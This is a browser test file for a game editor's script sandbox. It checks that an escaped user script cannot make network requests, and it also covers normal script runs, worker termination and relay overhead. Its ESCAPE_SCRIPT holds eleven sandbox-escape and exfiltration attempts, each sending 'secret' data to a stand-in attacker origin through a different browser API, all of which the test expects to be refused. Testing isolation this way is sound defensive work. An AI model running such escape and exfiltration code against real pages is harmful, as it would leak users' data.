/**
 * Real-browser proof for the sandboxed-origin script transport (#8700).
 *
 * jsdom enforces neither `sandbox` nor CSP, so the unit tests can only check
 * the configuration. This spec runs it in a real browser — Chromium
 * (playwright.ci.config.ts) and Firefox and WebKit
 * (playwright.crossbrowser.config.ts):
 *
 *   1. An escaped script — `(0).constructor.constructor('return fetch')()` —
 *      cannot get a single request out of the page: not same-origin, not a
 *      cross-origin `no-cors` POST, not `import()`, `importScripts`, XHR,
 *      WebSocket, EventSource or a nested worker. Run with
 *      `revokeNetworkGlobals()` STUBBED OUT of the worker, and the script
 *      confirms `fetch` is a live function, so the result is the frame's doing
 *      and not the enumeration's.
 *   2. A normal script still runs end to end through the transport: `onStart`
 *      and `onUpdate` post forge commands that arrive on the main thread.
 *   3. `terminate()` kills the worker.
 *   4. The relay's per-tick cost, measured against a plain Worker.
 *
 * What is REAL: `sandboxOrigin.ts` (bundled from source, including its default
 * worker-source loader path), `scriptWorker.ts` bundled by
 * `scripts/sandbox-worker-loader.cjs` — the same function the Next.js loader
 * calls, so these are the bytes production ships — and the editor's own CSP
 * (`buildContentSecurityPolicy({ allowUnsafeEval: true })`) on the host page,
 * which the srcdoc frame inherits.
 *
 * What is SUBSTITUTED: the editor page. A minimal host page on a fake origin
 * stands in for `useScriptRunner` — no engine, no stores, no Next server — so
 * that every request the browser makes is one this spec served or recorded.
 * Hence the substitution annotation and title marker (#10158).
 *
 * ## Per-browser expectations (CI run 35997735154, head a17c010f)
 *
 * - Chromium and Firefox: the transport RUNS scripts. All four tests assert the
 *   functional behaviour; the network assertions are identical in both.
 * - Firefox reports less ATTRIBUTION: see the escape test. The requests are
 *   still refused and asserted as refused; only the event naming the
 *   script-src directive was never delivered.
 * - WebKit: the transport does NOT run scripts. All four tests failed on both
 *   attempts: two recorded the host reporting
 *   `Script sandbox worker-error: Error: Script error.`, and the other two
 *   timed out at 30 s. The honest expectation there is FAIL CLOSED, so in
 *   WebKit every test asserts exactly that ({@link expectFailedClosed}): one
 *   `boot` failure with reason `worker-error` (the reason that selects the
 *   "can't run in this browser" creator message), nothing relayed, the frame
 *   gone, nothing on the network. Job 107639940511 (head 4f862259) measured
 *   the phase — `boot`, nothing relayed, frame gone, in all four — and showed
 *   WebKit routing the frame's own `blob:null/<uuid>` worker load, which
 *   `expectFailedClosed` now partitions out. The REASON is first measured by
 *   this revision; the whole account is printed on failure. If WebKit starts running the worker,
 *   these assertions go red — the signal to move WebKit to the functional
 *   branch and to update the docs that say Safari fails closed.
 *
 * "No request left the page" is asserted at the ROUTE layer: `context.route`
 * sees every request the browser would put on the network. CDP's `request`
 * event is NOT that — Chromium announces some worker loads (the XHR, the
 * dynamic import) before the renderer's CSP check cancels them, so they show up
 * as `request` + `requestfailed` without ever reaching the route. The spec
 * records both and asserts that each such announcement failed.
 */
import { test, expect, type BrowserContext, type Page } from '@playwright/test';
import { createRequire } from 'node:module';
import path from 'node:path';
import * as esbuild from 'esbuild';
import { buildContentSecurityPolicy } from '../../src/lib/security/csp';

interface SandboxWorkerLoader {
  bundleScriptWorker(options?: { minify?: boolean; plugins?: esbuild.Plugin[] }): Promise<{ code: string; inputs: string[] }>;
  toModuleSource(code: string): string;
}

const requireCjs = createRequire(__filename);
const WEB_ROOT = path.resolve(__dirname, '..', '..');
const loader = requireCjs(path.join(WEB_ROOT, 'scripts', 'sandbox-worker-loader.cjs')) as SandboxWorkerLoader;

const APP_ORIGIN = 'https://editor.sandbox-harness.test';
const ATTACKER_ORIGIN = 'https://attacker.sandbox-harness.test';
const HARNESS_ASSETS = [`GET ${APP_ORIGIN}/`, `GET ${APP_ORIGIN}/harness.js`];

/** Replaces revokeNetworkGlobals.ts in the worker bundle for the escape test only. */
const stubRevocation: esbuild.Plugin = {
  name: 'stub-revoke-network-globals',
  setup(build) {
    build.onLoad({ filter: /[\\/]revokeNetworkGlobals\.ts$/ }, () => ({
      loader: 'ts',
      contents:
        'export function revokeNetworkGlobals(): void {}\n' +
        'export function revokeNetworkGlobalsIfWorker(): boolean { return false; }\n',
    }));
  },
};

let harnessScript = '';
let productionWorker = '';
let unrevokedWorker = '';

test.beforeAll(async () => {
  productionWorker = (await loader.bundleScriptWorker()).code;
  const unrevoked = await loader.bundleScriptWorker({ plugins: [stubRevocation] });
  unrevokedWorker = unrevoked.code;
  // The stub must actually have replaced the module (lessons-learned #19):
  // same graph, different bytes.
  expect(unrevoked.inputs.some((input) => input.endsWith('revokeNetworkGlobals.ts'))).toBe(true);
  expect(unrevokedWorker).not.toBe(productionWorker);

  // The host page's script: the REAL sandboxOrigin module. Its placeholder import
  // gets exactly what the Next.js loader emits for it.
  const harness = await esbuild.build({
    stdin: {
      contents:
        "import { createSandboxedScriptHost } from './src/lib/scripting/sandboxOrigin';\n" +
        '(window as unknown as { __sandbox: unknown }).__sandbox = { createSandboxedScriptHost };\n',
      resolveDir: WEB_ROOT,
      loader: 'ts',
      sourcefile: 'harness-entry.ts',
    },
    absWorkingDir: WEB_ROOT,
    bundle: true,
    format: 'iife',
    platform: 'browser',
    target: 'es2022',
    write: false,
    logLevel: 'silent',
    plugins: [
      {
        name: 'sandbox-worker-loader',
        setup(build) {
          build.onLoad({ filter: /[\\/]scriptWorkerSource\.bundle\.ts$/ }, () => ({
            loader: 'js',
            contents: loader.toModuleSource(productionWorker),
          }));
        },
      },
    ],
  });
  harnessScript = harness.outputFiles[0].text;
  expect(harnessScript).toContain('spawnforge:script-sandbox:boot');
});

interface NetworkLog {
  routed: string[];
  announced: string[];
  failed: Map<string, string>;
  websockets: string[];
}

async function openHarness(context: BrowserContext): Promise<{ page: Page; net: NetworkLog }> {
  const net: NetworkLog = { routed: [], announced: [], failed: new Map(), websockets: [] };
  await context.route('**/*', async (route) => {
    const request = route.request();
    const key = `${request.method()} ${request.url()}`;
    net.routed.push(key);
    // A `blob:` URL is a local object URL, never network egress. WebKit hands
    // the sandbox frame's own worker load to this handler (job 107639940511);
    // answering it with the fake body below would replace the worker's source
    // and turn the test into a measurement of the harness. Recorded above,
    // then passed through to the browser untouched.
    if (request.url().startsWith('blob:')) return route.fallback();
    if (key === HARNESS_ASSETS[0]) {
      return route.fulfill({
        status: 200,
        contentType: 'text/html',
        headers: { 'content-security-policy': buildContentSecurityPolicy({ allowUnsafeEval: true }) },
        body: '<!doctype html><html><head><script src="/harness.js"></script></head><body></body></html>',
      });
    }
    if (key === HARNESS_ASSETS[1]) {
      return route.fulfill({ status: 200, contentType: 'text/javascript', body: harnessScript });
    }
    // Anything else would be an escape. Answer it as a willing attacker would,
    // so a leak cannot hide behind a network error.
    return route.fulfill({ status: 200, contentType: 'text/plain', body: 'received' });
  });
  const page = await context.newPage();
  page.on('request', (request) => net.announced.push(`${request.method()} ${request.url()}`));
  page.on('requestfailed', (request) =>
    net.failed.set(`${request.method()} ${request.url()}`, request.failure()?.errorText ?? ''),
  );
  page.on('websocket', (ws) => net.websockets.push(ws.url()));
  await page.goto(`${APP_ORIGIN}/`);
  await page.waitForFunction(() => 'createSandboxedScriptHost' in ((window as unknown as { __sandbox?: object }).__sandbox ?? {}));
  return { page, net };
}

interface RunResult {
  messages: Array<{ type: string; [key: string]: unknown }>;
  /** Everything the host passed to its (required) `onError`, in order. `reason` is set for `boot` only. */
  failures: Array<{ detail: string; phase: string; reason?: string }>;
}

/**
 * Start a host in the page, send init (+ optional ticks), and collect every
 * message until `until` matches one, the host reports a `boot` failure (after
 * which it has torn itself down, so nothing more can arrive), or the timeout
 * passes. Bounded in every browser: a transport that never answers ends the
 * wait at 15 s instead of hanging the test.
 */
async function runInSandbox(
  page: Page,
  opts: { source?: string; scripts: Array<{ entityId: string; source: string }>; ticks?: number; until: string },
): Promise<RunResult> {
  return page.evaluate(
    ({ source, scripts, ticks, until }) =>
      new Promise<RunResult>((resolve) => {
        const api = (window as unknown as {
          __sandbox: {
            createSandboxedScriptHost: (o: Record<string, unknown>) => {
              postMessage(m: unknown): void;
              onmessage: ((e: MessageEvent) => void) | null;
              terminate(): void;
            };
          };
        }).__sandbox;
        const messages: RunResult['messages'] = [];
        const failures: RunResult['failures'] = [];
        const finish = () => resolve({ messages, failures });
        const host = api.createSandboxedScriptHost({
          // undefined => the module's own default loader, i.e. the bundled string.
          loadWorkerSource: source === undefined ? undefined : () => Promise.resolve(source),
          onError: (detail: string, phase: string, reason?: string) => {
            failures.push(reason === undefined ? { detail, phase } : { detail, phase, reason });
            if (phase === 'boot') finish();
          },
        });
        (window as unknown as { __host: unknown }).__host = host;
        host.onmessage = (event) => {
          const data = event.data as RunResult['messages'][number];
          messages.push(data);
          if (JSON.stringify(data).includes(until)) finish();
        };
        host.postMessage({
          type: 'init',
          scripts: scripts.map((s) => ({ ...s, enabled: true })),
          entities: {},
          entityInfos: {},
          inputState: { pressed: {}, justPressed: {}, justReleased: {}, axes: {} },
        });
        for (let i = 1; i <= (ticks ?? 0); i++) {
          host.postMessage({ type: 'tick', dt: 0.016, elapsed: i * 0.016, entities: {}, entityInfos: {}, inputState: {} });
        }
        setTimeout(finish, 15_000);
      }),
    opts,
  );
}

/**
 * WebKit's expectation: the scripts never start, and that is reported and
 * contained rather than silent (see the header). Every clause is the property a
 * creator or an attacker depends on:
 *
 * - exactly one failure, phase `boot`, reason `worker-error` — which is what
 *   makes `useScriptRunner` stop Play and show the creator the
 *   "can't run in this browser" message (not the retry one, which would be a
 *   dead end here) instead of letting ticks run into the watchdog, and it
 *   never falls back to the same-origin transport (both pinned in
 *   useScriptRunner.test.ts);
 * - no protocol message relayed — no script output of any kind came back;
 * - the frame is gone — the host tore itself down, so nothing can start later;
 * - nothing on the network but the harness's own two files (see the blob
 *   note below).
 *
 * The whole result goes in the failure message, so a WebKit that behaves
 * differently says exactly how in the CI log.
 */
async function expectFailedClosed(page: Page, net: NetworkLog, result: RunResult): Promise<void> {
  const account = JSON.stringify({
    failures: result.failures,
    messageTypes: result.messages.map((m) => m.type),
    routed: net.routed,
  });
  test.info().annotations.push({ type: 'webkit-fail-closed', description: account });
  expect(result.failures.map((f) => [f.phase, f.reason]), account).toEqual([['boot', 'worker-error']]);
  expect(result.messages, account).toEqual([]);
  expect(await page.locator('iframe').count(), account).toBe(0);
  // WebKit hands the frame's own `blob:` worker load to the route handler
  // (job 107639940511: every WebKit test saw exactly one extra
  // `GET blob:null/<uuid>`, a fresh UUID each run). A blob: URL is a local
  // object URL, not network egress, and `null` is the frame's opaque origin —
  // the bootstrap's `URL.createObjectURL` of the worker source. So it is
  // partitioned out HERE ONLY, and as narrowly as it can be: the exact
  // `blob:null/<uuid>` shape, at most one per test. A `blob:https://…` entry
  // (an object URL minted by the app origin) or any other URL stays in the
  // strict comparison and fails it. Chromium and Firefox keep the strict
  // `toEqual(HARNESS_ASSETS)` in their own branches.
  // `openHarness` passes `blob:` loads through (route.fallback), so the worker
  // WebKit starts runs the real bootstrap source and a worker-error here is
  // WebKit's own, not the harness's fake response body.
  const FRAME_BLOB = /^GET blob:null\/[0-9a-f-]{36}$/;
  const frameBlobs = net.routed.filter((entry) => FRAME_BLOB.test(entry));
  const rest = net.routed.filter((entry) => !FRAME_BLOB.test(entry));
  expect(rest, account).toEqual(HARNESS_ASSETS);
  expect(frameBlobs.length, account).toBeLessThanOrEqual(1);
  expect(net.routed.filter((entry) => entry.startsWith('GET blob:') && !FRAME_BLOB.test(entry)), account).toEqual([]);
  expect(net.websockets).toEqual([]);
}

const logs = (result: RunResult, prefix: string) =>
  result.messages
    .filter((m) => m.type === 'log' && typeof m.message === 'string' && (m.message as string).startsWith(prefix))
    .map((m) => (m.message as string).slice(prefix.length));

/** Every escape attempt an author could reach from `(0).constructor.constructor`. */
const ESCAPE_SCRIPT = `
function onStart() {
  var F = (0).constructor.constructor;
  var scope = F('return self')();
  var violations = [];
  scope.addEventListener('securitypolicyviolation', function (v) {
    violations.push(v.effectiveDirective + ' ' + v.blockedURI);
  });
  var realFetch = F('return fetch')();
  forge.log('probe:fetch-type:' + typeof realFetch);
  forge.log('probe:origin:' + F('return self.origin')());
  var SAME = ${JSON.stringify(APP_ORIGIN)};
  var CROSS = ${JSON.stringify(ATTACKER_ORIGIN)};
  function settle(fn) {
    return new Promise(function (resolve, reject) {
      try { Promise.resolve(fn()).then(resolve, reject); } catch (e) { reject(e); }
    });
  }
  function viaEvents(open) {
    return function () {
      return new Promise(function (resolve, reject) { open(resolve, reject); });
    };
  }
  var attempts = [
    ['fetch-same-origin', function () { return realFetch(SAME + '/api/exfil?d=secret', { method: 'POST', body: 'secret' }); }],
    ['fetch-cross-origin-no-cors-post', function () { return realFetch(CROSS + '/collect', { mode: 'no-cors', method: 'POST', body: 'secret' }); }],
    ['fetch-via-prototype', function () { return Object.getPrototypeOf(scope).fetch.call(scope, CROSS + '/proto', { mode: 'no-cors', method: 'POST', body: 'secret' }); }],
    // Script loads are governed by script-src, not connect-src. The editor's own
    // (inherited) policy already refuses a foreign host, so the SAME-origin
    // pair is what proves the frame's script-src names no network source.
    ['dynamic-import-same-origin', function () { return F('u', 'return import(u)')(SAME + '/_next/static/chunk.js?d=secret'); }],
    ['dynamic-import-cross-origin', function () { return F('u', 'return import(u)')(CROSS + '/module.js?d=secret'); }],
    ['import-scripts-same-origin', function () { return F('return importScripts')()(SAME + '/_next/static/chunk.js?d=secret'); }],
    ['import-scripts-cross-origin', function () { return F('return importScripts')()(CROSS + '/classic.js?d=secret'); }],
    ['xhr', viaEvents(function (resolve, reject) {
      var X = F('return XMLHttpRequest')();
      var x = new X(); x.open('POST', CROSS + '/xhr'); x.onload = function () { resolve(x.status); };
      x.onerror = function () { reject(new Error('xhr error')); }; x.send('secret');
    })],
    ['websocket', viaEvents(function (resolve, reject) {
      var W = F('return WebSocket')();
      var s = new W('wss://attacker.sandbox-harness.test/ws'); s.onopen = function () { resolve('open'); };
      s.onerror = function () { reject(new Error('ws error')); };
    })],
    ['event-source', viaEvents(function (resolve, reject) {
      var E = F('return EventSource')();
      var s = new E(CROSS + '/sse'); s.onopen = function () { resolve('open'); };
      s.onerror = function () { s.close(); reject(new Error('sse error')); };
    })],
    ['nested-worker-fetch', viaEvents(function (resolve, reject) {
      var Wk = F('return Worker')(); var B = F('return Blob')(); var U = F('return URL')();
      var src = 'fetch(' + JSON.stringify(CROSS + '/nested') + ',{mode:"no-cors",method:"POST",body:"secret"}).then(function(){postMessage("sent")},function(e){postMessage("blocked:"+e.name)})';
      var w = new Wk(U.createObjectURL(new B([src])));
      w.onmessage = function (m) { m.data === 'sent' ? resolve(m.data) : reject(new Error(m.data)); };
      w.onerror = function (e) { reject(new Error('nested worker error')); };
    })],
  ];
  Promise.all(attempts.map(function (a) {
    return settle(a[1]).then(
      function (r) { forge.log('probe:result:' + a[0] + ':resolved:' + String(r && r.type || r)); },
      function (e) { forge.log('probe:result:' + a[0] + ':rejected:' + (e && e.name) + ':' + (e && e.message)); }
    );
  })).then(function () {
    forge.log('probe:violations:' + JSON.stringify(violations));
    forge.log('probe:done');
  });
}
`;

test.describe(
  'Script sandbox isolation (#8700) [substituted: editor page] @ui',
  { annotation: { type: 'substitution', description: 'editor page' } },
  () => {
    test('an escaped script cannot make any network request, with revokeNetworkGlobals stubbed out', async ({ context, browserName }) => {
      const { page, net } = await openHarness(context);
      const result = await runInSandbox(page, {
        source: unrevokedWorker,
        scripts: [{ entityId: 'attacker', source: ESCAPE_SCRIPT }],
        until: 'probe:done',
      });

      if (browserName === 'webkit') {
        // The escape script never runs in WebKit, so there are no outcomes to
        // inspect; what CAN be asserted is that nothing ran and nothing left.
        await expectFailedClosed(page, net, result);
        return;
      }

      // Preconditions: the probe ran to the end, so the outcomes below are all
      // of them and not a prefix.
      expect(result.failures).toEqual([]);
      expect(logs(result, 'probe:').at(-1)).toBe('done');
      // The enumeration is OFF: the constructor chain hands back a live fetch.
      // Whatever blocks the requests below, it is not revokeNetworkGlobals().
      expect(logs(result, 'probe:fetch-type:')).toEqual(['function']);
      // The frame is an opaque origin, so it cannot read the editor's cookies or storage.
      expect(logs(result, 'probe:origin:')).toEqual(['null']);

      // LOAD-BEARING, first: every attempt ran and was refused — none silently
      // skipped (lessons #11) — and nothing reached the network but the two
      // files this spec served. These hold in every browser that runs scripts.
      const outcomes = logs(result, 'probe:result:');
      expect(outcomes).toHaveLength(11);
      for (const outcome of outcomes) {
        expect(outcome, outcome).toMatch(/:rejected:/);
      }
      expect(net.routed).toEqual(HARNESS_ASSETS);
      expect(net.websockets).toEqual([]);
      // Any request the browser announced beyond those was cancelled before sending.
      for (const announced of net.announced.filter((r) => !HARNESS_ASSETS.includes(r))) {
        expect(net.failed.get(announced), announced).toBeTruthy();
      }

      // ATTRIBUTION, last: the browser's own account of WHY — CSP violations in
      // the frame's policy, as seen by a listener on the worker's global. This
      // is diagnostic, not the control: the refusals above are asserted whether
      // or not an event names them. Which events a worker receives is
      // browser-specific, so each browser asserts only what it has been SEEN
      // to report:
      // - Chromium reports both directives.
      // - Firefox reports connect-src only. In CI run 35997735154 (head
      //   a17c010f, both attempts) every assertion above the script-src one
      //   passed in Firefox — 11 refusals, live fetch, null origin, and a
      //   connect-src event — but no script-src violation event reached the
      //   worker for the refused import()/importScripts() loads. The loads were
      //   still refused; only the event is missing, so Firefox does not assert it.
      // - WebKit never gets here (fail-closed branch above).
      const violations = JSON.parse(logs(result, 'probe:violations:')[0] ?? '[]') as string[];
      test.info().annotations.push({ type: 'csp-violations', description: violations.join(' | ') });
      expect(violations.some((v) => v.startsWith('connect-src ')), violations.join(' | ')).toBe(true);
      if (browserName === 'chromium') {
        expect(violations.some((v) => v.startsWith('script-src')), violations.join(' | ')).toBe(true);
      }
    });

    test('a normal script runs end to end through the sandboxed transport, with revocation still on', async ({ context, browserName }) => {
      const { page, net } = await openHarness(context);
      const script = `
        function onStart() {
          forge.setPosition(entityId, 1, 2, 3);
          forge.log('started:' + typeof (0).constructor.constructor('return fetch')());
        }
        var n = 0;
        function onUpdate(dt) {
          n += 1;
          forge.setPosition(entityId, n, dt, 0);
          if (n === 3) forge.log('three-ticks');
        }
      `;
      // Wait for tick 3's COMMANDS, not its log: the worker posts forge.log
      // immediately and flushes commands at the end of the tick.
      // No `source`: the host loads the worker through its own default path —
      // the string the build-time loader put in scriptWorkerSource.bundle.ts.
      const result = await runInSandbox(page, { scripts: [{ entityId: 'player', source: script }], ticks: 3, until: '"position":[3,' });
      if (browserName === 'webkit') {
        // Does not hold in WebKit today (CI run 35997735154): the scripts never
        // start, so assert the fail-closed behaviour instead of this one.
        await expectFailedClosed(page, net, result);
        return;
      }
      expect(result.failures).toEqual([]);

      const commands = result.messages
        .filter((m) => m.type === 'commands')
        .flatMap((m) => m.commands as Array<Record<string, unknown>>);
      expect(commands[0]).toEqual({ cmd: 'update_transform', entityId: 'player', position: [1, 2, 3] });
      expect(commands.slice(1).map((c) => (c.position as number[])[0])).toEqual([1, 2, 3]);
      // Production bytes still revoke: belt-and-braces inside the frame.
      expect(logs(result, 'started:')).toEqual(['undefined']);
      expect(logs(result, 'three-ticks')).toEqual(['']);
      expect(net.routed).toEqual(HARNESS_ASSETS);
    });

    test('terminate() ends the worker, even one that never yields', async ({ context, browserName }) => {
      const { page, net } = await openHarness(context);
      const spinning = { scripts: [{ entityId: 'spin', source: "function onStart() { forge.log('spinning'); }" }], until: 'spinning' };
      if (browserName === 'webkit') {
        // No worker runs in WebKit (CI run 35997735154, where this test timed
        // out at 30 s), so there is nothing to terminate. The host has already
        // torn itself down; terminating it again is a no-op.
        const result = await runInSandbox(page, spinning);
        await expectFailedClosed(page, net, result);
        await page.evaluate(() => (window as unknown as { __host: { terminate(): void } }).__host.terminate());
        expect(await page.locator('iframe').count()).toBe(0);
        return;
      }
      // Every wait below is bounded, so a transport that never starts fails
      // here with a named reason instead of burning the test timeout.
      const workerStarted = page.waitForEvent('worker', { timeout: 20_000 });
      const started = await runInSandbox(page, spinning);
      expect(started.failures).toEqual([]);
      expect(logs(started, 'spinning')).toEqual(['']);
      const worker = await workerStarted;
      const closed = new Promise<void>((resolve, reject) => {
        const timer = setTimeout(() => reject(new Error('the worker did not close within 5 s of terminate()')), 5_000);
        worker.once('close', () => {
          clearTimeout(timer);
          resolve();
        });
      });
      // Spin the worker's thread so it can never read a terminate message: only
      // discarding the frame can stop it.
      await page.evaluate(() => {
        const host = (window as unknown as { __host: { postMessage(m: unknown): void; terminate(): void } }).__host;
        host.postMessage({ type: 'init', scripts: [{ entityId: 'spin', enabled: true, source: 'function onStart(){ var F=(0).constructor.constructor; F("for(;;){}")(); }' }] });
      });
      await page.evaluate(() => (window as unknown as { __host: { terminate(): void } }).__host.terminate());
      await closed;
      expect(await page.locator('iframe').count()).toBe(0);
    });

    test('relay cost per tick against a plain Worker (measurement, loose bound)', async ({ context, browserName }) => {
      const { page, net } = await openHarness(context);
      if (browserName === 'webkit') {
        // Nothing to measure: the sandboxed worker does not run in WebKit (CI
        // run 35997735154, where this test timed out at 30 s inside the
        // measurement, which had no bound of its own).
        const result = await runInSandbox(page, {
          scripts: [{ entityId: 'bench', source: 'function onUpdate(dt) { forge.setPosition(entityId, dt, 0, 0); }' }],
          ticks: 3,
          until: 'update_transform',
        });
        await expectFailedClosed(page, net, result);
        return;
      }
      const ROUNDS = 200;
      const measured = await page.evaluate(
        async ({ source, rounds }) => {
          const script = { entityId: 'bench', enabled: true, source: 'function onUpdate(dt) { forge.setPosition(entityId, dt, 0, 0); }' };
          const init = { type: 'init', scripts: [script], entities: {}, entityInfos: {}, inputState: {} };
          type Port = { postMessage(m: unknown): void; onmessage: ((e: MessageEvent) => void) | null };
          // Each round trip is bounded, and a host failure is named in the
          // rejection, so a transport that stops answering fails fast.
          let hostFailure = 'none reported';
          const roundTrips = async (port: Port, label: string) => {
            let waiting: (() => void) | null = null;
            port.onmessage = (event) => {
              if ((event.data as { type?: string }).type === 'commands' && waiting) waiting();
            };
            port.postMessage(init);
            const times: number[] = [];
            let batchStart = 0;
            for (let i = 0; i < rounds + 20; i++) {
              if (i === 20) batchStart = performance.now();
              const t0 = performance.now();
              await new Promise<void>((resolve, reject) => {
                const timer = setTimeout(
                  () => reject(new Error(`${label}: no answer to tick ${i} within 5000 ms (host failure: ${hostFailure})`)),
                  5_000,
                );
                waiting = () => {
                  clearTimeout(timer);
                  resolve();
                };
                port.postMessage({ type: 'tick', dt: 0.016, elapsed: i, entities: {}, entityInfos: {}, inputState: {} });
              });
              if (i >= 20) times.push(performance.now() - t0); // skip warm-up
            }
            // performance.now() is coarsened to 100 us outside cross-origin
            // isolation, so a single round trip reads as 0.0 or 0.1; the batch
            // mean is the finer number.
            const mean = (performance.now() - batchStart) / rounds;
            times.sort((a, b) => a - b);
            return { mean, p50: times[Math.floor(times.length / 2)], p95: times[Math.floor(times.length * 0.95)] };
          };
          const direct = new Worker(URL.createObjectURL(new Blob([source], { type: 'text/javascript' })));
          const baseline = await roundTrips(direct, 'plain Worker');
          direct.terminate();
          type HostOptions = { onError: (detail: string, phase: string) => void };
          const api = (window as unknown as { __sandbox: { createSandboxedScriptHost: (o: HostOptions) => Port & { terminate(): void } } }).__sandbox;
          const host = api.createSandboxedScriptHost({
            onError: (detail, phase) => {
              hostFailure = `${phase}: ${detail}`;
            },
          });
          const sandboxed = await roundTrips(host, 'sandboxed host');
          host.terminate();
          return { baseline, sandboxed };
        },
        { source: productionWorker, rounds: ROUNDS },
      );
      const overhead = measured.sandboxed.mean - measured.baseline.mean;
      test.info().annotations.push({
        type: 'relay-overhead',
        description:
          `per-tick round trip over ${ROUNDS} ticks: plain Worker mean ${measured.baseline.mean.toFixed(3)} ms ` +
          `(p50 ${measured.baseline.p50.toFixed(1)}, p95 ${measured.baseline.p95.toFixed(1)}); sandboxed mean ` +
          `${measured.sandboxed.mean.toFixed(3)} ms (p50 ${measured.sandboxed.p50.toFixed(1)}, p95 ` +
          `${measured.sandboxed.p95.toFixed(1)}); relay overhead ${overhead.toFixed(3)} ms per tick`,
      });
      // A deliberately loose bound — this is a measurement, not a perf gate. The
      // worker's own 16 ms onUpdate warning times the hook INSIDE the worker, so
      // relay latency cannot trip it; this only guards against a pathological relay.
      expect(measured.sandboxed.p50).toBeLessThan(16);
    });
  },
);
